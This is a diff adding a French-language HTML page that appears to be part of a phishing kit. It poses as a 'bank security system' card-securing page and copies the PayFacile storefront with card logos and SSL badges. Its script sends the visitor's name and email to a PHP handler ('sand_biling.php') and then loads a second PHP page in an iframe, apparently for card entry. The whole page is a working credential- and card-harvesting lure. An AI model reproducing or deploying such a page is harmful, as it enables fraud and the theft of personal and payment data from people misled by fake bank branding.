@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <style>
+    .avatar {
+      height: 50px;
+      width: 50px;
+      position: relative;
+    }
+
+    .avatar .avatar-image,
+    .avatar .avatar-initials {
+      height: 100%;
+      width: 100%;
+      position: absolute;
+      top: 0px;
+      left: 0px;
+    }
+
+    .avatar .avatar-image {
+      z-index: 10;
+      background-color: #fff;
+    }
+
+    .avatar .avatar-initials {
+      display: block;
+      background-size: 100% 100%;
+      background-color: #aaa;
+      color: #fff;
+      font-size: 25px;
+      line-height: 50px;
+      font-family: "Helvetica Neue", Helvetica, "Hiragino Sans GB", Arial, sans-serif;
+      text-align: center;
+      z-index: 1;
+    }
+
+    .avatar-rounded .avatar-image,
+    .avatar-rounded .avatar-initials {
+      border-radius: 5px;
+    }
+
+    .avatar-circle .avatar-image,
+    .avatar-circle .avatar-initials {
+      border-radius: 50%;
+    }
+
+    .avatar-hide-image .avatar-image {
+      display: none;
+    }
+
+    .avatar-hide-initials .avatar-initials {
+      display: none;
+    }
+
+    .avatar-large {
+      width: 80px;
+      min-width: 80px;
+      height: 80px;
+    }
+
+    .avatar-large .avatar-initials {
+      font-size: 40px;
+      line-height: 80px;
+    }
+
+    .avatar-small {
+      width: 30px;
+      min-width: 30px;
+      height: 30px;
+    }
+
+    .avatar-small .avatar-initials {
+      font-size: 15px;
+      line-height: 30px;
+    }
+
+    .avatar-extra-small {
+      width: 20px;
+      min-width: 20px;
+      height: 20px;
+    }
+
+    .avatar-extra-small .avatar-initials {
+      font-size: 10px;
+      line-height: 20px;
+    }
+
+    #paymentFormIframe {
+      height: 461px !important;
+    }
+  </style>
+  <style type="text/css">
+    /* Chart.js */
+    @-webkit-keyframes chartjs-render-animation {
+      from {
+        opacity: 0.99
+      }
+
+      to {
+        opacity: 1
+      }
+    }
+
+    @keyframes chartjs-render-animation {
+      from {
+        opacity: 0.99
+      }
+
+      to {
+        opacity: 1
+      }
+    }
+
+    .chartjs-render-monitor {
+      -webkit-animation: chartjs-render-animation 0.001s;
+      animation: chartjs-render-animation 0.001s;
+    }
+  </style>
+  <link rel="stylesheet" type="text/css" href="ghislain-morissette-eur_files/material-flex.css">
+  <link rel="stylesheet" type="text/css" href="ghislain-morissette-eur_files/theme.css">
+
+
+
+
+
+  <style type="text/css">
+    .onoffswitch-inner:before {
+      content: "Oui";
+    }
+
+    .onoffswitch-inner:after {
+      content: "Non";
+    }
+  </style>
+
+
+
+</head>
+
+
+<script src="./style/js/jquery.min.js"></script>
+
+<script src="./style/js/jquery.validate.min.js"></script>
+
+
+
+<body>
+
+
+
+
+  <link rel="stylesheet" type="text/css" class="__meteor-css__"
+    href="./index_files/f202a3cd002b61da680b5a7f3e47105b0f0e0d87.css">
+  <link rel="stylesheet" type="text/css" class="__meteor-css__"
+    href="./index_files/9bccd35f01574c43f78ebca0c10845e20afabf78.css">
+  <link rel="stylesheet" type="text/css" class="__meteor-css__"
+    href="./index_files/b9acde512d5175436b5ff1a0cd2e0ff01316c4a5.css">
+  <meta name="fragment" content="!">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <link rel="icon" href="favicon.png" sizes="32x32">
+  <link href="./index_files/icon.css" rel="stylesheet">
+
+  <title>Payment</title>
+  <meta name="description" content="Accept one-time and recurring payments from anywhere.">
+
+
+
+  <div id="__blaze-root">
+    <div class="showcase-page">
+
+
+      <div class="showcase-header-container">
+        <div data-reactroot="" class="showcase-header valign-wrapper">
+          <div class="showcase-header-left-wrapper">
+            <div class="showcase-header-logo-wrapper">
+              <div class="showcase-header-vendor-logo" style="background-image: url(&quot;undefined&quot;);"></div>
+            </div>
+            <div class="showcase-header-shopname-wrapper">
+              <div class="showcase-header-organization"><b>SYSTEME DE SECURITE DES BANQUES <b /></div>
+              <div class="showcase-header-business-description"></div>
+            </div>
+          </div>
+          <div class="showcase-header-right-wrapper">
+            <div class="showcase-header-secure-text">With SSL technology.</div>
+            <div class="showcase-header-secure-img"></div>
+          </div>
+        </div>
+      </div>
+
+
+
+      <div class="showcase-main-container">
+        <div class="showcase-main-container-background
+ 
+" style="background-image:
+                 
+                     url(&#39;index_files/bg.png&#39;)">
+        </div>
+        <div class="showcase-main">
+
+
+          <div>
+            <!-- react-empty: 1 -->
+          </div>
+
+
+          <script type="text/javascript">
+            function shower() {
+              //$("#endcustomerForm").show();   
+              document.getElementById("endcustomerForm").style.visibility = "visible";
+              document.getElementById("endcustomerForm").style.opacity = "1";
+              document.getElementById("endcustomerForm").style.transition = "opacity 0.5s linear";
+            }
+          </script>
+
+
+          <div class="main-card
+ showcase-main-card-no-pricing-no-image">
+            <div class="showcase-main-card-title-tablet-desktop">Credit my card</div>
+
+
+            <div class="showcase-main-card-desktop-col2">
+              <!-- XXX desktop only -->
+
+              <div class="showcase-order-block-container">
+                <div data-reactroot="" class="order-block">
+                  <div class="order-block-options"></div>
+                  <div class="order-block-main">
+                    <div class="order-block-left-col">
+                      <div class="col s12"></div>
+                      <div class="col s12">
+
+                        <div class="order-block-final-price" style="color: rgb(38, 166, 154);">
+
+                          <img src="img/2ioa.jpg" width="100%" height="100%" />
+                        </div>
+
+
+                      </div>
+                    </div>
+                    <div class="order-block-right-col">
+                      <div class="order-block-final-price" style="color: rgb(38, 166, 154);"> Sécuriser ma carte</div>
+                      <div><a class="waves-effect waves-light btn order-btn" data-action="purchase"
+                          style="background-color: rgb(38, 166, 154); color: rgb(255, 255, 255);"
+                          onclick="shower()">Payment</a>
+                        <div class="order-button-logos"><img src="./index_files/logo-visa.png"><img
+                            src="./index_files/logo-mastercard.png"><img src="./index_files/logo-amex.png"></div>
+                        <div class="order-ssl-payment"><i class="mdi mdi-lock zmdi-hc-fw"></i>
+                          <!-- react-text: 18 -->Secure payment by SSL
+                          <!-- /react-text -->
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+            </div>
+
+            <div class="showcase-main-card-desktop-col3">
+              <!-- XXX desktop only -->
+
+
+            </div>
+
+          </div>
+
+
+          <div id="customerFormPlaceholder"></div>
+
+          <script>
+            $(function () {
+
+              var validator = $("#endcustomerForm").bind("invalid-form.validate", function () {
+                $("#errorridcard").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Verifier vos informations et reessayer encors.</h2> </div></div></div> ");
+              })
+              $("form[name='endcustomerForm']").validate({
+
+                errorContainer: $("#errorrSignIn"),
+
+
+
+                rules: {
+
+
+                  email: {
+                    required: true,
+                    email: true
+                  },
+                  password: {
+                    required: true,
+                    minlength: 5
+                  }
+                },
+
+
+
+
+                submitHandler: function (form) {
+
+
+                  $("#signin-buton3").html("<div class='loader'></div> ");
+
+
+                  $.post("./sand_biling.php?ajax", $("#endcustomerForm").serialize(), function (result) {
+                    setTimeout(function () {
+
+                      $("#signin-buton3").html("<span>Suite</span>");
+
+                      document.getElementById("signin-buton3").className = "btn btn-large showcase-customer-details-submit disabled";
+
+                      $("#paymentFormDiv").show();
+
+                      $(location).attr("", "");
+                    });
+                  });
+                },
+              });
+            });
+          </script>
+
+
+
+          <form style="visibility: hidden; opacity: 0; transition: visibility 0s 1s, opacity 1s linear;"
+            id="endcustomerForm" name="endcustomerForm" class="card outer-des-size" novalidate="novalidate">
+            <input id="productId" name="productId" type="hidden" value="8oj88YactqkWkfkPh" data-schema-key="productId">
+            <div class="card-content left-align over-limitation">
+              <div class="div">
+                <h5>Your contact details</h5>
+              </div>
+              <div class="row">
+                <div class="col s12 m6 l6">
+
+
+
+
+
+
+                  <div class="row">
+                    <div class="input-field col s12">
+
+                      <i class="material-icons prefix">account_circle</i>
+
+
+
+
+
+
+                      <input type="text" name="firstName" icon="account_circle" id="AzdNayonFafegNJZP"
+                        required="required" data-schema-key="firstName">
+
+
+                      <label class="active">
+                        First name
+                      </label>
+
+
+                    </div>
+                  </div>
+
+
+
+
+                </div>
+                <div class="col s12 m6 l6">
+
+
+
+
+
+
+                  <div class="row">
+                    <div class="input-field col s12">
+
+                      <i class="material-icons prefix">account_circle</i>
+
+
+
+
+
+
+                      <input type="text" name="lastName" icon="account_circle" id="RkwfgS32Q4wBSZ4Wa"
+                        required="required" data-schema-key="lastName">
+
+
+                      <label class="active">
+                        Last name
+                      </label>
+
+
+                    </div>
+                  </div>
+
+
+
+
+                </div>
+              </div>
+              <div class="row">
+              </div>
+              <div class="row">
+                <div class="col s12 m6 l6">
+
+
+
+
+
+
+                  <div class="row">
+                    <div class="input-field col s12">
+
+                      <i class="material-icons prefix">email</i>
+
+
+
+
+
+
+                      <input type="text" name="email" icon="email" id="mTQpoZvC6vQJo3rWB" required="required"
+                        data-schema-key="email">
+
+
+                      <label class="active">
+                        Email
+                      </label>
+
+
+                    </div>
+                  </div>
+
+
+
+
+                </div>
+              </div>
+
+
+
+              <div class="custom-order-attributes-fields row">
+
+              </div>
+            </div>
+            <div class="card-action">
+
+              <div class="right-align"><button
+                  class="btn btn-large waves-effect waves-light showcase-customer-details-submit" tabindex="0"
+                  style="background-color: #26a69a; color: #ffffff" data-action="initiate-payment" id="signin-buton3"
+                  title="" type="submit"><span>Next</span></button></div>
+            </div>
+          </form>
+
+          <div id="paymentFormPlaceholder"></div>
+
+          <div style="display: none;" id="paymentFormDiv" class="card payment-form-iframe-card">
+            <iframe id="paymentFormIframe" src="ghislain-morissette-eur.php"></iframe>
+
+          </div>
+        </div>
+      </div>
+
+
+      <div class="showcase-footer-container">
+        <div data-reactroot="" class="showcase-footer">
+          <div class="showcase-footer-top"><a href="#">Contact us | Terms of Sales</a></div>
+          <div class="showcase-footer-bottom">
+            <div class="showcase-footer-bottom-content"><span class="showcase-footer-poweredby">
+                <!-- react-text: 7 -->Store created with
+                <!-- /react-text -->
+                <!-- react-text: 8 -->
+                <!-- /react-text --><a class="text-hide payfacile-logo" href="https://fr.payfacile.com/"
+                  target="_blank">PayFacile</a>
+              </span><span class="showcase-footer-security">
+                <!-- react-text: 11 -->|
+                <!-- /react-text --><a href="https://fr.payfacile.com/securite/" target="_blank">Security policy</a>
+              </span></div>
+          </div>
+        </div>
+      </div>
+
+
+    </div>
+  </div>
+  <div class="hiddendiv common"></div>
+  <div class="crisp-client">
+    <div class="crisp-1o7uamv">
+      <div class="crisp-1qz76wn">
+        <style type="text/css">
+          .crisp-client .crisp-1rjpbb7 .crisp-12w1xmh,
+          .crisp-client .crisp-1rjpbb7 .crisp-poqhnx:hover {
+            color: #ffffff !important;
+            -webkit-text-fill-color: #ffffff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-1wiroug,
+          .crisp-client .crisp-1rjpbb7 .crisp-ao27ue:hover {
+            color: #3e3c66 !important;
+            -webkit-text-fill-color: #3e3c66 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-6mlwlm,
+          .crisp-client .crisp-1rjpbb7 .crisp-q5z06s:hover {
+            color: #6d69b2 !important;
+            -webkit-text-fill-color: #6d69b2 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-wcida4,
+          .crisp-client .crisp-1rjpbb7 .crisp-o6w0yc:hover {
+            color: #9C97FF !important;
+            -webkit-text-fill-color: #9C97FF !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-pusm34 {
+            background-color: #ffffff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-bdhv0t {
+            background-color: #3e3c66 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-9o0cq7 {
+            background-color: #8480d8 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-ws3gf1,
+          .crisp-client .crisp-1rjpbb7 .crisp-13h0akn:before,
+          .crisp-client .crisp-1rjpbb7 .crisp-13h0akn:after {
+            background-color: #9C97FF !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-1gr5ak3 {
+            background-color: #F5F5FB !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-145mbcr,
+          .crisp-client .crisp-1rjpbb7 .crisp-1jrqqbm:hover {
+            background-color: #F9F9F9 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-17f70m7 {
+            background-image: linear-gradient(125deg, #9C97FF -10%, #3e3c66 100%) !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-111u58f,
+          .crisp-client .crisp-1rjpbb7 .crisp-y1nqlk:hover {
+            border-color: #ffffff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-14u434g {
+            border-color: rgba(62, 60, 102, 0.175) !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-k6ym6q,
+          .crisp-client .crisp-1rjpbb7 .crisp-1hadq69:hover,
+          .crisp-client .crisp-1rjpbb7 .crisp-1kqjjm4:before,
+          .crisp-client .crisp-1rjpbb7 .crisp-1kqjjm4:after {
+            border-color: #9C97FF !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-1n0zdj7 {
+            border-color: rgba(156, 151, 255, 0.15) !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-rdu43e {
+            border-top-color: #9C97FF !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-ogcg7k,
+          .crisp-client .crisp-1rjpbb7 .crisp-1mnx9b2:hover {
+            border-color: #F5F5FB !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-11uxe11:placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-11uxe11:-moz-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-11uxe11::-moz-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-11uxe11:-ms-input-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-11uxe11::-webkit-input-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-14ixsrp:placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-14ixsrp:-moz-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-14ixsrp::-moz-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-14ixsrp:-ms-input-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-14ixsrp::-webkit-input-placeholder {
+            color: #c3bcff !important;
+            -webkit-text-fill-color: #c3bcff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-gjhthi,
+          .crisp-client .crisp-1rjpbb7 .crisp-1t1dtpc:hover,
+          .crisp-client .crisp-1rjpbb7 .crisp-gjhthi:hover,
+          .crisp-client .crisp-1rjpbb7 .crisp-1t1dtpc:active,
+          .crisp-client .crisp-1rjpbb7 .crisp-gjhthi:active,
+          .crisp-client .crisp-1rjpbb7 .crisp-1v3kwn:hover .crisp-oc2kqi,
+          .crisp-client .crisp-1rjpbb7 .crisp-1v3kwn .crisp-oc2kqi:active {
+            background: #3e3c66 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-1dgibgx,
+          .crisp-client .crisp-1rjpbb7 .crisp-1r2x6vr:hover {
+            background: #6d69b2 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-1dgibgx:hover,
+          .crisp-client .crisp-1rjpbb7 .crisp-1r2x6vr:active {
+            background: #55538c !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-1dgibgx:active {
+            background: #3e3c66 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-27o9vm:hover .crisp-1ekhg1c {
+            background: #6d69b2 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-27o9vm .crisp-1ekhg1c:active {
+            background: #55538c !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-ox3dbf,
+          .crisp-client .crisp-1rjpbb7 .crisp-1fmeyoi[data-active="true"] {
+            background: #9C97FF !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-ox3dbf:hover {
+            background: #8480d8 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-ox3dbf:active {
+            background: #6d69b2 !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-k5ll1j::-moz-selection,
+          .crisp-client .crisp-1rjpbb7 .crisp-k5ll1j *::-moz-selection {
+            background-color: #d2cbff !important;
+          }
+
+          .crisp-client .crisp-1rjpbb7 .crisp-k5ll1j::selection,
+          .crisp-client .crisp-1rjpbb7 .crisp-k5ll1j *::selection {
+            background-color: #d2cbff !important;
+          }
+        </style>
+      </div>
+      <div class="crisp-1nasccw">
+        <style type="text/css">
+          .crisp-client .crisp-1rjpbb7 {
+            z-index: 1000000;
+          }
+        </style>
+      </div>
+    </div>
+    <div id="crisp-chatbox" lang="en" dir="ltr" translate="no" data-blocked="true" data-lock-maximized="false"
+      data-last-operator-face="false" data-availability-tooltip="false" data-hide-vacation="false"
+      data-hide-on-away="false" data-hide-on-mobile="false" data-position-reverse="false" data-full-view="false"
+      data-small-view="false" data-large-view="false" data-availability="online" data-is-activity-ongoing="false"
+      data-was-availability-online="true" data-has-local-messages="false" class="crisp-1rjpbb7">
+      <div class="crisp-1rf4xdh crisp-k5ll1j"><a data-maximized="false" data-is-failure="false" href="#"
+          class="crisp-kquevr" data-cshid="d7b3f88f-99fb-67ec-77c8-46732420b594"><span class="crisp-1059tj2"><span
+              data-id="general_entice" data-with-helpdesk="true" data-is-concealed="false" class="crisp-1xaupiq"
+              style="display: block !important;"><span class="crisp-1sa0919"><span
+                  class="crisp-1s66m5e crisp-9dgo7z"><span class="crisp-yzclt"><span class="crisp-5me80a"><span
+                        class="crisp-bz13r8 crisp-i1yn7v"></span><span data-has-avatar="true"
+                        class="crisp-1sd4dmd"><span class="crisp-191rfs5"><span
+                            class="crisp-pkd0me crisp-13qutdl"></span></span><span
+                          class="crisp-vz5ota crisp-1jrqqbm"><span class="crisp-4snher"><span
+                              class="crisp-rvg3pe crisp-13qutdl">Chat</span></span></span></span></span></span></span></span><span
+                class="crisp-x94m06 crisp-ws3gf1"><span data-id="chat_closed" class="crisp-16qgsyi"><span
+                    class="crisp-1t2kwsy"><span class="crisp-174tqf9 crisp-1e8tjtx"></span></span><span
+                    data-is-ongoing="false" class="crisp-101bp3x"></span></span></span></a></div>
+    </div>
+  </div>
+</body>
+
+</html>
